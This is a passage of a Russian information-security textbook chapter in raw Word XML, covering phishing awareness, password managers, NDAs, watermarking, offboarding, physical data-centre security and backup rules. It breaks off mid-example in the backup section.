      <w:r>
        <w:t xml:space="preserve"> (председатель избирательной кампании Хиллари Клинтон).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Отправили письмо: "Google обнаружил подозрительную активность, смените пароль"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ссылка вела на поддельную страницу Google (`http://bit.ly/...` → перенаправление на `https://google-security.phishingsite.com`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Подеста ввёл пароль → хакеры получили доступ к почте</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Украли 50 000 писем → слили в WikiLeaks → скандал на всю Америку</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Урок</w:t>
      </w:r>
      <w:r>
        <w:t>: Даже умные люди попадаются на фишинг. Нужно обучение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Симуляция фишинга</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Компания отправляет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>тестовые фишинговые письма</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> своим сотрудникам, чтобы проверить их бдительность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отправляем письмо: "HR-отдел: обновите данные для расчёта зарплаты по ссылке"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ссылка ведёт на внутреннюю страницу компании: "Вы попались на фишинг! Пройдите обучение"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кто кликнул → отправляем на обязательный тренинг</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (реальная статистика одной компании):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**1-я симуляция**: 35% сотрудников кликнули</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**2-я симуляция** (через 3 месяца после обучения): 12% кликнули</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**3-я симуляция** (через 6 месяцев): 5% кликнули</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Политика паролей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плохие пароли</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (топ-10 самых популярных паролей в 2023 году):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`123456`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`password`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`123456789`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`12345678`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`qwerty`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`abc123`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`111111`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`password1`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`iloveyou`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`admin`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правила хорошего пароля:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Длина**: минимум 12 символов (лучше 16+)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сложность**: буквы (заглавные + строчные) + цифры + символы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уникальность**: не использовать один пароль для разных сайтов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Непредсказуемость**: не `Qwerty123!`, а `g7$mP#9vLx2@nK4Z`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: Невозможно запомнить 50 сложных паролей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение — Менеджеры паролей:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**1Password**, **Bitwarden**, **KeePassXC** (open-source)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хранят пароли в **зашифрованном хранилище** (AES-256)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нужно запомнить только **один мастер-пароль**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Генерируют случайные пароли (например, `hJ8#mV$9xLp2@qR5`)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример использования Bitwarden</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Установить Bitwarden CLI</w:t>
        <w:br/>
        <w:t>npm install -g @bitwarden/cli</w:t>
        <w:br/>
        <w:t># Войти</w:t>
        <w:br/>
        <w:t>bw login email@example.com</w:t>
        <w:br/>
        <w:t># Сохранить новый пароль</w:t>
        <w:br/>
        <w:t>bw create item --name "GitHub" --username "alice" --password "g7$mP#9vLx2@nK4Z" --url "https://github.com"</w:t>
        <w:br/>
        <w:t># Получить пароль</w:t>
        <w:br/>
        <w:t>bw get password GitHub</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.4.6. Организационные меры: Политика, договоры, процедуры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Техника — это хорошо, но нужны ещё </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>правила игры</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>NDA (Non-Disclosure Agreement) — Договор о неразглашении</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Юридический документ, который запрещает сотруднику/подрядчику разглашать конфиденциальную информацию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда подписывается:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При приёме на работу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Перед началом проекта (для подрядчиков)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При увольнении (чтобы не слил данные конкурентам)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что происходит при нарушении?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Штраф (например, $100 000)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Увольнение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Судебное преследование</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Инженер Tesla в 2018 году слил внутренние данные журналистам → Tesla подала в суд → суд обязал выплатить $167 миллионов убытков.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Водяные знаки (Watermarking)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Чтобы отследить, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>кто именно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> слил документ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждому сотруднику выдаётся PDF с **уникальным водяным знаком** (невидимым или видимым)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если документ утёк → по водяному знаку находим, кто слил</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сотрудник А получает документ с невидимым водяным знаком: `ID:A4F2E9`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сотрудник Б получает документ с водяным знаком: `ID:B7G3X1`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Документ публикуется на форуме → извлекаем водяной знак → виноват сотрудник Б</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Технология</w:t>
      </w:r>
      <w:r>
        <w:t>: Стеганография (скрытие данных в изображениях, PDF).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Need-to-know principle — Принцип "нужно знать"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Доступ к информации предоставляется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>только тем, кому это необходимо для работы</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разработчик знает структуру БД, но **не видит** реальные данные клиентов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Бухгалтер видит зарплаты сотрудников, но **не видит** исходный код</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка видит логи приложения, но **не видит** финансовые отчёты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Exit interview — Процедура при увольнении</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делать, когда сотрудник увольняется:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Отключить доступы**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Корпоративная почта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>VPN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SSH-ключи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Доступ к GitHub/GitLab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Облачные сервисы (AWS, Google Cloud)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Забрать устройства**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ноутбук, телефон (если корпоративные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>USB-ключи, смарт-карты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Удалённо стереть данные**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если сотрудник работал на личном ноутбуке (BYOD — Bring Your Own Device) → использовать MDM (Mobile Device Management) для удалённого стирания корпоративных данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Провести проверку**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не скопировал ли сотрудник конфиденциальные данные перед увольнением?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DLP-логи: были ли попытки скачать большие объёмы данных за последние 2 недели?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Сотрудник Google в 2019 году за неделю до увольнения скачал </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>14 000 файлов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> с исходным кодом, переписку, документы. Затем устроился в конкурирующий стартап. Google подала в суд → суд обязал вернуть данные + штраф.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.4.7. Физическая безопасность: Защита железа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Можно настроить самый крутой firewall, но если хакер </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>физически</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> зайдёт в серверную → game over.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Контроль доступа в дата-центры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Меры безопасности:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Пропускная система**: магнитные карты, биометрия (отпечаток пальца, сканирование радужки)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Охрана**: 24/7 охрана, видеонаблюдение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Мантрэп (mantrap)**: двойная дверь — нельзя открыть вторую, пока не закрылась первая (чтобы нельзя было "проскочить" за легитимным сотрудником)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Клетки (cages)**: каждый клиент (компания) имеет отдельную клетку с замком</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Дата-центр Equinix (крупнейший в мире) — чтобы попасть к серверам, нужно пройти:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Регистрация на входе + проверка паспорта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Магнитная карта для входа в здание</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Второй уровень: биометрия (отпечаток пальца)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Третий уровень: клетка с кодовым замком</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Видеонаблюдение на всех этапах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Защита от кражи устройств</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: Украли ноутбук → все данные доступны (если диск не зашифрован).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифрование диска** (BitLocker, LUKS, FileVault) — см. раздел 9.4.1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Удалённая блокировка/стирание**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Find My Device (Windows)**: можно удалённо заблокировать или стереть ноутбук</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Find My Mac (macOS)**: аналогично</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MDM (Mobile Device Management)** для корпоративных устройств</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример настройки Find My Device (Windows)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Настройки → Конфиденциальность и безопасность → Find My Device → Включить</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если ноутбук украли → зайти на https://account.microsoft.com/devices → "Удалённое стирание".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Clean Desk Policy — Чистый стол</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правило</w:t>
      </w:r>
      <w:r>
        <w:t>: Не оставляй конфиденциальные документы на столе, когда уходишь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уборщица может сфотографировать документ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Посетитель (клиент, подрядчик) может увидеть конфиденциальные данные на мониторе</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Меры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Блокировка компьютера (Win+L) при выходе из-за стола</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Документы убираются в запирающийся шкаф</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.4.8. Резервное копирование (Backup): План Б на случай всего</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связь с конфиденциальностью</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Если хакер украл данные, хотя бы не потерять их. Но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>важно</w:t>
      </w:r>
      <w:r>
        <w:t>: backup тоже нужно шифровать, иначе хакер украдёт резервные копии.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Правило 3-2-1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правило резервного копирования</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**3** копии данных (оригинал + 2 backup)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**2** разных типа носителей (например, SSD + облако)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**1** копия **offsite** (за пределами офиса, чтобы при пожаре/потопе не потерять все копии)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
